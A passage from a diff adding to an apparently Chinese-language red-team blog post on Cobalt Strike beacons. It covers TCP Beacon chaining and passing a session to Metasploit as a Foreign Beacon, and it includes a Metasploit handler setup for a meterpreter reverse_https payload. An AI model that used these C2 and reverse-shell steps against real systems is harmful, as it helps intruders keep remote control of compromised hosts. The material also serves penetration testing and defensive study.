+
+如果需要断开和某个会话的连接，使用unlink命令即可，想再次连上使用link就可以。
+
+### TCP Beacon
+
+TCP Beacon与SMB Beacon类似，区别在于使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量时不加密的。
+
+在新建tcp beacon时可以指定监听的端口，假设为8888，在不出网的目标主机上执行后，目标主机会监听8888端口，然后父Beacon中使用connect命令进行连接：
+
+![image-20220213210419805](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png)
+
+### Foreign Beacon
+
+使用CS的Foreign Beacon可以派生到meterpreter会话，有http和https两种监听器。
+
+首先在msf中起一个监听器：
+
+```shell
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_https
+payload => windows/meterpreter/reverse_https
+msf exploit(handler) > set lhost 10.211.55.2
+lhost => msf ip
+msf exploit(handler) > set lport 4444
+lport => 4444
+msf exploit(handler) > exploit
+```
+
+然后在cs里配置，填上msf的ip和监听端口。
+
+然后选择会话右键派生，会话选择forign beacon：
+
+![image-20240227195131535](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png)
+
+随后在msf中就会接收到会话：
+
+![image-20240227195228315](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png)
+
+
+           Start/Stop a SOCKS4a/SOCKS5 server to relay traffic
     spawn                     Spawn a session 
     spawnas                   Spawn a session as another user
     spawnto                   Set executable to spawn processes into
